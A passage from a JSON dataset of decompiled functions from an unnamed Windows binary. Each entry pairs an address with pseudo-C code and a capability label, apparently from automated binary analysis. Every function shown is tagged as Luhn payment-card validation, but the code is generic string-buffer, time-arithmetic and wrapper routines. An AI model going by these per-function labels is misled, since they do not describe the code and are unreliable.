        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004260b0(uint arg_8h)\n\n{\n    uint *puVar1;\n    int32_t *piVar2;\n    int32_t **ppiVar3;\n    uint arg_ch;\n    int32_t unaff_EBP;\n    uint var_11h;\n    uint var_4h;\n    \n    fcn.0043ad3e(8);\n    *(unaff_EBP + -4) = 0;\n    piVar2 = fcn.00451296();\n    if (*piVar2 != 0) {\n        piVar2 = fcn.0045129f();\n        if (*piVar2 == 0) {\n            ppiVar3 = fcn.00451296();\n            if (**ppiVar3 != -0x1fbcb0b3) {\n                ppiVar3 = fcn.00451296();\n                if (**ppiVar3 != -0x1fbcbcae) {\n                    *(unaff_EBP + -0x11) = 1;\n                    arg_ch = fcn.00451296();\n                    fcn.00425d21(*(unaff_EBP + 8), arg_ch, unaff_EBP + -0x11);\n                    goto code_r0x00426149;\n                }\n            }\n        }\n    }\n    puVar1 = *(unaff_EBP + 8);\n    *puVar1 = 0;\n    puVar1[1] = 0;\ncode_r0x00426149:\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 352
    },
    "004269cf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004269cf(int32_t *arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    char cVar3;\n    uint uVar4;\n    uint uVar5;\n    uint unaff_EBX;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_4h;\n    \n    var_4h = *0x49106c ^ &stack0xfffffffc;\n    uVar4 = fcn.00421120(arg_ch);\n    if (arg_10h == 0) {\n        fcn.00426ffe(arg_ch);\n        pcVar1 = **arg_8h;\n        (**0x4742a4)(uVar4);\n        (*pcVar1)();\n    }\n    else {\n        fcn.00427226(&var_14h, 1);\n        fcn.00426ffe(arg_ch);\n        iVar2 = *arg_8h;\n        uVar5 = fcn.004270be(arg_10h, &var_14h);\n        pcVar1 = *(iVar2 + 4);\n        (**0x4742a4)(uVar4, uVar5);\n        cVar3 = (*pcVar1)();\n        if (cVar3 == '\\0') {\n            fcn.00427226(&var_14h, 1);\n            fcn.004270be(arg_10h, &var_14h);\n        }\n    }\n    fcn.0042707f(arg_ch);\n    fcn.0043a2e7(unaff_EBX);\n    return;\n}\n",
        "token_count": 375
    },
    "00426bb4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00426bb4(uint arg_8h, uint arg_ch)\n\n{\n    fcn.004269cf(arg_8h, arg_ch, 0);\n    return;\n}\n",
        "token_count": 44
    },
    "00427129": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00427129(uint *arg_8h)\n\n{\n    int32_t extraout_ECX;\n    ulong uVar1;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    fcn.00439515(&var_8h);\n    uVar1 = fcn.0043aee0(var_8h + 0x2ac18000, var_4h + -0x19db1df + (0xd53e7fff < var_8h), 10000000, 0);\n    *arg_8h = uVar1;\n    arg_8h[1] = uVar1 >> 0x20;\n    arg_8h[2] = extraout_ECX * 100;\n    return;\n}\n",
        "token_count": 191
    },
    "00427177": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t * __cdecl fcn.00427177(uint32_t *arg_8h, uint32_t *arg_ch, uint32_t *arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    bool bVar5;\n    \n    *arg_8h = *arg_ch;\n    arg_8h[1] = arg_ch[1];\n    arg_8h[2] = arg_ch[2];\n    arg_8h[3] = arg_ch[3];\n    uVar4 = arg_8h[2];\n    if (uVar4 < 0) {\n        do {\n            uVar3 = *arg_8h;\n            uVar1 = uVar3 - 1;\n            *arg_8h = uVar1;\n            uVar3 = arg_8h[1] - (uVar3 == 0);\n            uVar4 = uVar4 + 1000000000;\n            arg_8h[1] = uVar3;\n        } while (uVar4 < 0);\n        arg_8h[2] = uVar4;\n    }\n    else {\n        uVar1 = *arg_8h;\n        uVar3 = arg_8h[1];\n    }\n    if (999999999 < uVar4) {\n        do {\n            uVar3 = *arg_8h;\n            uVar4 = uVar4 + 0xc4653600;\n            uVar1 = uVar3 + 1;\n            *arg_8h = uVar1;\n            uVar3 = arg_8h[1] + (0xfffffffe < uVar3);\n            arg_8h[1] = uVar3;\n        } while (999999999 < uVar4);\n        arg_8h[2] = uVar4;\n    }\n    uVar2 = uVar1 - *arg_10h;\n    uVar3 = (uVar3 - arg_10h[1]) - (uVar1 < *arg_10h);\n    uVar1 = uVar4 - arg_10h[2];\n    if (uVar4 < arg_10h[2]) {\n        bVar5 = uVar2 == 0;\n        uVar2 = uVar2 - 1;\n        uVar3 = uVar3 - bVar5;\n        uVar1 = uVar1 + 1000000000;\n    }\n    arg_8h[1] = uVar3;\n    *arg_8h = uVar2;\n    arg_8h[2] = uVar1;\n    if ((uVar3 < 0) || (((uVar2 | uVar3) == 0 && (uVar1 < 1)))) {\n        *arg_8h = 0;\n        arg_8h[1] = 0;\n        arg_8h[2] = 0;\n    }\n    return arg_8h;\n}\n",
        "token_count": 664
    },
    "004274f3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.004274f3(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint *puVar1;\n    uint var_8h;\n    \n    puVar1 = fcn.00427568(&var_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n    *arg_8h = *puVar1;\n    arg_8h[1] = puVar1[1];\n    return arg_8h;\n}\n",
        "token_count": 127
    },
    "00427568": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00427568(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    fcn.00427523(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n    return arg_8h;\n}\n",
        "token_count": 77
    },
    "0042758d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0042758d(int16_t *arg_8h, uint arg_ch)\n\n{\n    int16_t iVar1;\n    int16_t *piVar2;\n    \n    iVar1 = *arg_8h;\n    piVar2 = arg_8h;\n    while ((iVar1 != 0 && (iVar1 != arg_ch))) {\n        piVar2 = piVar2 + 1;\n        iVar1 = *piVar2;\n    }\n    return piVar2 - arg_8h >> 1;\n}\n",
        "token_count": 119
    },
    "00427bd5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00427bd5(uint32_t arg_8h, uint noname_1, uint arg_10h)\n\n{\n    code *pcVar1;\n    int32_t *in_ECX;\n    int32_t iVar2;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    if (arg_8h < 0x7fffffff) {\n        var_4h = in_ECX[5];\n        var_8h = fcn.00429860(arg_8h);\n        iVar2 = (var_8h + 1U) * 2;\n        if (0x7fffffff < var_8h + 1U) {\n            iVar2 = -1;\n        }\n        iVar2 = fcn.00408d10(iVar2);\n        in_ECX[4] = arg_8h;\n        in_ECX[5] = var_8h;\n        fcn.004012b0(iVar2, arg_10h, arg_8h);\n        *(iVar2 + arg_8h * 2) = 0;\n        if (7 < var_4h) {\n            var_8h = *in_ECX;\n            var_4h = var_4h * 2 + 2;\n            if (0xfff < var_4h) {\n                fcn.00401470(&var_8h, &var_4h);\n            }\n            fcn.0043a7bc(var_8h);\n        }\n        *in_ECX = iVar2;\n        return;\n    }\n    fcn.00430d89();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 374
    },
    "00427c81": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00427c81(uint32_t arg_8h, uint noname_1, uint arg_10h)\n\n{\n    code *pcVar1;\n    int32_t *in_ECX;\n    int32_t iVar2;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    if (arg_8h < 0x7fffffff) {\n        var_4h = in_ECX[5];\n        var_8h = fcn.00429860(arg_8h);\n        iVar2 = (var_8h + 1U) * 2;\n        if (0x7fffffff < var_8h + 1U) {\n            iVar2 = -1;\n        }\n        iVar2 = fcn.00408d10(iVar2);\n        in_ECX[4] = arg_8h;\n        in_ECX[5] = var_8h;\n        fcn.00451500(iVar2, arg_10h, arg_8h * 2);\n        *(arg_8h * 2 + iVar2) = 0;\n        if (7 < var_4h) {\n            var_8h = *in_ECX;\n            var_4h = var_4h * 2 + 2;\n            if (0xfff < var_4h) {\n                fcn.00401470(&var_8h, &var_4h);\n            }\n            fcn.0043a7bc(var_8h);\n        }\n        *in_ECX = iVar2;\n        return;\n    }\n    fcn.00430d89();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 376
    },
    "00427d2f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00427d2f(uint32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t arg_10h_00;\n    uint arg_ch_00;\n    code *pcVar1;\n    int32_t iVar2;\n    uint arg_8h_00;\n    uint *in_ECX;\n    int32_t arg_8h_01;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    arg_10h_00 = in_ECX[4];\n    if (arg_8h <= 0x7ffffffeU - arg_10h_00) {\n        var_4h = in_ECX[5];\n        var_8h = arg_8h + arg_10h_00;\n        iVar2 = fcn.00409230(var_8h);\n        arg_8h_01 = (iVar2 + 1U) * 2;\n        if (0x7fffffff < iVar2 + 1U) {\n            arg_8h_01 = -1;\n        }\n        arg_8h_00 = fcn.00408d10(arg_8h_01);\n        in_ECX[4] = var_8h;\n        in_ECX[5] = iVar2;\n        if (var_4h < 8) {\n            fcn.00429513(arg_8h_00, in_ECX, arg_10h_00, arg_10h, arg_14h, arg_18h);\n        }\n        else {\n            arg_ch_00 = *in_ECX;\n            fcn.00429513(arg_8h_00, arg_ch_00, arg_10h_00, arg_10h, arg_14h, arg_18h);\n            var_4h = var_4h * 2 + 2;\n            var_8h = arg_ch_00;\n            if (0xfff < var_4h) {\n                fcn.00401470(&var_8h, &var_4h);\n            }\n            fcn.0043a7bc(var_8h);\n        }\n        *in_ECX = arg_8h_00;\n        return;\n    }\n    fcn.00409220();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 543
    },
    "00427dfe": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00427dfe(uint32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t arg_10h_00;\n    uint arg_ch_00;\n    code *pcVar1;\n    int32_t iVar2;\n    uint arg_8h_00;\n    uint *in_ECX;\n    int32_t arg_8h_01;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    arg_10h_00 = in_ECX[4];\n    if (arg_8h <= 0x7ffffffeU - arg_10h_00) {\n        var_4h = in_ECX[5];\n        var_8h = arg_8h + arg_10h_00;\n        iVar2 = fcn.00429860(var_8h);\n        arg_8h_01 = (iVar2 + 1U) * 2;\n        if (0x7fffffff < iVar2 + 1U) {\n            arg_8h_01 = -1;\n        }\n        arg_8h_00 = fcn.00408d10(arg_8h_01);\n        in_ECX[4] = var_8h;\n        in_ECX[5] = iVar2;\n        if (var_4h < 8) {\n            fcn.00429569(arg_8h_00, in_ECX, arg_10h_00, arg_10h, arg_14h);\n        }\n        else {\n            arg_ch_00 = *in_ECX;\n            fcn.00429569(arg_8h_00, arg_ch_00, arg_10h_00, arg_10h, arg_14h);\n            var_4h = var_4h * 2 + 2;\n            var_8h = arg_ch_00;\n            if (0xfff < var_4h) {\n                fcn.00401470(&var_8h, &var_4h);\n            }\n            fcn.0043a7bc(var_8h);\n        }\n        *in_ECX = arg_8h_00;\n        return;\n    }\n    fcn.00430d89();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 527
    },
    "00427eca": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00427eca(uint32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t arg_10h_00;\n    uint arg_ch_00;\n    code *pcVar1;\n    int32_t iVar2;\n    uint arg_8h_00;\n    uint *in_ECX;\n    int32_t arg_8h_01;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    arg_10h_00 = in_ECX[4];\n    if (arg_8h <= 0x7ffffffeU - arg_10h_00) {\n        var_4h = in_ECX[5];\n        var_8h = arg_8h + arg_10h_00;\n        iVar2 = fcn.00429860(var_8h);\n        arg_8h_01 = (iVar2 + 1U) * 2;\n        if (0x7fffffff < iVar2 + 1U) {\n            arg_8h_01 = -1;\n        }\n        arg_8h_00 = fcn.00408d10(arg_8h_01);\n        in_ECX[4] = var_8h;\n        in_ECX[5] = iVar2;\n        if (var_4h < 8) {\n            fcn.00429513(arg_8h_00, in_ECX, arg_10h_00, arg_10h, arg_14h, arg_18h);\n        }\n        else {\n            arg_ch_00 = *in_ECX;\n            fcn.00429513(arg_8h_00, arg_ch_00, arg_10h_00, arg_10h, arg_14h, arg_18h);\n            var_4h = var_4h * 2 + 2;\n            var_8h = arg_ch_00;\n            if (0xfff < var_4h) {\n                fcn.00401470(&var_8h, &var_4h);\n            }\n            fcn.0043a7bc(var_8h);\n        }\n        *in_ECX = arg_8h_00;\n        return;\n    }\n    fcn.00430d89();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 542
    },
    "00427f99": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00427f99(uint32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t arg_10h_00;\n    uint arg_ch_00;\n    code *pcVar1;\n    int32_t iVar2;\n    uint arg_8h_00;\n    uint *in_ECX;\n    int32_t arg_8h_01;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    arg_10h_00 = in_ECX[4];\n    if (arg_8h <= 0x7ffffffeU - arg_10h_00) {\n        var_4h = in_ECX[5];\n        var_8h = arg_8h + arg_10h_00;\n        iVar2 = fcn.00429860(var_8h);\n        arg_8h_01 = (iVar2 + 1U) * 2;\n        if (0x7fffffff < iVar2 + 1U) {\n            arg_8h_01 = -1;\n        }\n        arg_8h_00 = fcn.00408d10(arg_8h_01);\n        in_ECX[4] = var_8h;\n        in_ECX[5] = iVar2;\n        if (var_4h < 8) {\n            fcn.004295a6(arg_8h_00, in_ECX, arg_10h_00, arg_10h, arg_14h);\n        }\n        else {\n            arg_ch_00 = *in_ECX;\n            fcn.004295a6(arg_8h_00, arg_ch_00, arg_10h_00, arg_10h, arg_14h);\n            var_4h = var_4h * 2 + 2;\n            var_8h = arg_ch_00;\n            if (0xfff < var_4h) {\n                fcn.00401470(&var_8h, &var_4h);\n            }\n            fcn.0043a7bc(var_8h);\n        }\n        *in_ECX = arg_8h_00;\n        return;\n    }\n    fcn.00430d89();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 529
    },
    "00428065": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00428065(uint32_t arg_8h, uint noname_1, uint arg_10h)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t *in_ECX;\n    int32_t iVar4;\n    uint var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    iVar1 = in_ECX[4];\n    if (arg_8h <= 0x7ffffffeU - iVar1) {\n        var_4h = in_ECX[5];\n        var_8h = arg_8h + iVar1;\n        iVar3 = fcn.00429860(var_8h);\n        iVar4 = (iVar3 + 1U) * 2;\n        if (0x7fffffff < iVar3 + 1U) {\n            iVar4 = -1;\n        }\n        iVar4 = fcn.00408d10(iVar4);\n        iVar1 = iVar1 * 2;\n        in_ECX[4] = var_8h;\n        in_ECX[5] = iVar3;\n        if (var_4h < 8) {\n            fcn.00451500(iVar4);\n            *(iVar1 + iVar4) = arg_10h;\n            *(iVar1 + 2 + iVar4) = 0;\n        }\n        else {\n            iVar3 = *in_ECX;\n            fcn.00451500(iVar4, iVar3, iVar1);\n            *(iVar1 + iVar4) = arg_10h;\n            *(iVar1 + 2 + iVar4) = 0;\n            var_4h = var_4h * 2 + 2;\n            var_8h = iVar3;\n            if (0xfff < var_4h) {\n                fcn.00401470(&var_8h, &var_4h);\n            }\n            fcn.0043a7bc(var_8h);\n        }\n        *in_ECX = iVar4;\n        return;\n    }\n    fcn.00430d89();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 483
    },
    "0042814e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042814e(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    fcn.004274f3(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n    return arg_8h;\n}\n",
        "token_count": 79
    },
    "00429896": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00429896(uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint *in_ECX;\n    int32_t arg_8h_00;\n    uint32_t uVar3;\n    uint var_4h;\n    \n    uVar1 = arg_8h[4];\n    if (7 < arg_8h[5]) {\n        arg_8h = *arg_8h;\n    }\n    if (uVar1 < 8) {\n        *in_ECX = *arg_8h;\n        in_ECX[1] = arg_8h[1];\n        in_ECX[2] = arg_8h[2];\n        in_ECX[3] = arg_8h[3];\n        uVar3 = 7;\n    }\n    else {\n        uVar3 = 0x7ffffffe;\n        if ((uVar1 | 7) < 0x7fffffff) {\n            uVar3 = uVar1 | 7;\n        }\n        arg_8h_00 = (uVar3 + 1) * 2;\n        if (0x7fffffff < uVar3 + 1) {\n            arg_8h_00 = -1;\n        }\n        uVar2 = fcn.00408d10(arg_8h_00);\n        *in_ECX = uVar2;\n        fcn.00451500(uVar2, arg_8h, uVar1 * 2 + 2);\n    }\n    in_ECX[4] = uVar1;\n    in_ECX[5] = uVar3;\n    return;\n}\n",
        "token_count": 364
    },
    "0042eaf0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042eaf0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint var_4h;\n    \n    fcn.00429829(arg_8h, arg_ch + arg_8h);\n    return;\n}\n",
        "token_count": 59
    },
    "00430084": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00430084(uint *arg_8h, uint arg_ch, uint arg_10h, uint16_t *arg_14h, int32_t arg_18h)\n\n{\n    if (arg_18h != 0) {\n        do {\n            fcn.004294ea(*arg_14h);\n            arg_14h = arg_14h + 1;\n            arg_18h = arg_18h + -1;\n        } while (arg_18h != 0);\n    }\n    *arg_8h = arg_ch;\n    arg_8h[1] = arg_10h;\n    return;\n}\n",
        "token_count": 143
    },
    "00430d9f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00430d9f(uint32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint *in_ECX;\n    uint32_t var_4h;\n    \n    iVar1 = in_ECX[4];\n    if (in_ECX[5] - iVar1 < arg_8h) {\n        var_4h = in_ECX & 0xffffff00;\n        fcn.00427dfe(arg_8h, var_4h, arg_8h, arg_ch);\n    }\n    else {\n        in_ECX[4] = iVar1 + arg_8h;\n        if (7 < in_ECX[5]) {\n            in_ECX = *in_ECX;\n        }\n        fcn.004012b0(in_ECX + iVar1 * 2, arg_ch, arg_8h);\n        *(in_ECX + (iVar1 + arg_8h) * 2) = 0;\n    }\n    return;\n}\n",
        "token_count": 219
    },
    "00430dfd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00430dfd(uint arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint *in_ECX;\n    uint32_t var_4h;\n    \n    iVar1 = in_ECX[4];\n    if (in_ECX[5] - iVar1 < arg_ch) {\n        var_4h = in_ECX & 0xffffff00;\n        fcn.00427f99(arg_ch, var_4h, arg_8h, arg_ch);\n    }\n    else {\n        in_ECX[4] = iVar1 + arg_ch;\n        if (7 < in_ECX[5]) {\n            in_ECX = *in_ECX;\n        }\n        fcn.00451a80(in_ECX + iVar1 * 2, arg_8h, arg_ch * 2);\n        *(in_ECX + (iVar1 + arg_ch) * 2) = 0;\n    }\n    return;\n}\n",
        "token_count": 212
    },
    "00430e5e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00430e5e(uint32_t arg_8h, uint arg_ch)\n\n{\n    uint *in_ECX;\n    uint *arg_8h_00;\n    uint32_t var_4h;\n    \n    if (arg_8h < in_ECX[5] || arg_8h == in_ECX[5]) {\n        arg_8h_00 = in_ECX;\n        if (7 < in_ECX[5]) {\n            arg_8h_00 = *in_ECX;\n        }\n        in_ECX[4] = arg_8h;\n        fcn.004012b0(arg_8h_00, arg_ch, arg_8h);\n        *(arg_8h_00 + arg_8h * 2) = 0;\n    }\n    else {\n        var_4h = in_ECX & 0xffffff00;\n        fcn.00427bd5(arg_8h, var_4h, arg_ch);\n    }\n    return;\n}\n",
        "token_count": 222
    },
    "00430eac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00430eac(int16_t *arg_8h)\n\n{\n    int16_t iVar1;\n    int16_t *piVar2;\n    \n    piVar2 = arg_8h;\n    do {\n        iVar1 = *piVar2;\n        piVar2 = piVar2 + 1;\n    } while (iVar1 != 0);\n    fcn.00430ed3(arg_8h, piVar2 - (arg_8h + 1) >> 1);\n    return;\n}\n",
        "token_count": 116
    },
    "00430ed3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00430ed3(uint arg_8h, uint32_t arg_ch)\n\n{\n    uint *in_ECX;\n    uint *puVar1;\n    uint32_t var_4h;\n    \n    if (arg_ch < in_ECX[5] || arg_ch == in_ECX[5]) {\n        puVar1 = in_ECX;\n        if (7 < in_ECX[5]) {\n            puVar1 = *in_ECX;\n        }\n        in_ECX[4] = arg_ch;\n        fcn.00451a80(puVar1, arg_8h, arg_ch * 2);\n        *(arg_ch * 2 + puVar1) = 0;\n    }\n    else {\n        var_4h = in_ECX & 0xffffff00;\n        fcn.00427c81(arg_ch, var_4h, arg_8h);\n    }\n    return;\n}\n",
        "token_count": 202
    },
    "0042995b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.0042995b(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t in_ECX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = 0;\n    var_8h = 0;\n    uVar1 = fcn.00421362(&var_4h, &arg_8h, 1, &var_ch, in_ECX + 0x18);\n    if (uVar1 < 0) {\n        uVar1 = 0xffff;\n    }\n    else {\n        uVar1 = uVar1 & 0xffff0000 | var_4h;\n    }\n    return uVar1;\n}\n",
        "token_count": 175
    },
    "004352e7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004352e7(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    int32_t arg_8h_00;\n    uint32_t uVar1;\n    code *pcVar2;\n    uint *in_ECX;\n    uint32_t var_4h;\n    \n    uVar1 = in_ECX[4];\n    if (arg_8h <= uVar1) {\n        if (in_ECX[5] - uVar1 < arg_ch) {\n            var_4h = in_ECX & 0xffffff00;\n            fcn.00427eca(arg_ch, var_4h, arg_8h, arg_ch, arg_10h);\n        }\n        else {\n            in_ECX[4] = uVar1 + arg_ch;\n            if (7 < in_ECX[5]) {\n                in_ECX = *in_ECX;\n            }\n            arg_8h_00 = in_ECX + arg_8h * 2;\n            fcn.00451a80(arg_8h_00 + arg_ch * 2, arg_8h_00, (uVar1 - arg_8h) * 2 + 2);\n            fcn.004012b0(arg_8h_00, arg_10h, arg_ch);\n        }\n        return;\n    }\n    fcn.00430d94();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 328
    },
    "00435361": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00435361(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    int32_t arg_8h_00;\n    uint32_t uVar1;\n    code *pcVar2;\n    uint *in_ECX;\n    uint32_t var_4h;\n    \n    uVar1 = in_ECX[4];\n    if (arg_8h <= uVar1) {\n        if (in_ECX[5] - uVar1 < arg_ch) {\n            var_4h = in_ECX & 0xffffff00;\n            fcn.00427d2f(arg_ch, var_4h, arg_8h, arg_ch, arg_10h);\n        }\n        else {\n            in_ECX[4] = uVar1 + arg_ch;\n            if (7 < in_ECX[5]) {\n                in_ECX = *in_ECX;\n            }\n            arg_8h_00 = in_ECX + arg_8h * 2;\n            fcn.00451a80(arg_8h_00 + arg_ch * 2, arg_8h_00, (uVar1 - arg_8h) * 2 + 2);\n            fcn.004012b0(arg_8h_00, arg_10h, arg_ch);\n        }\n        return;\n    }\n    fcn.00407420();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 328
    },
    "00435606": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00435606(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint *puVar1;\n    uint var_8h;\n    \n    puVar1 = fcn.00435676(&var_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n    *arg_8h = *puVar1;\n    arg_8h[1] = puVar1[1];\n    return arg_8h;\n}\n",
        "token_count": 126
    },
    "00435676": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00435676(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    fcn.00435636(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n    return arg_8h;\n}\n",
        "token_count": 77
    },
    "00435784": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00435784(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    fcn.00435606(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n    return arg_8h;\n}\n",
        "token_count": 77
    },
    "00439ac7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
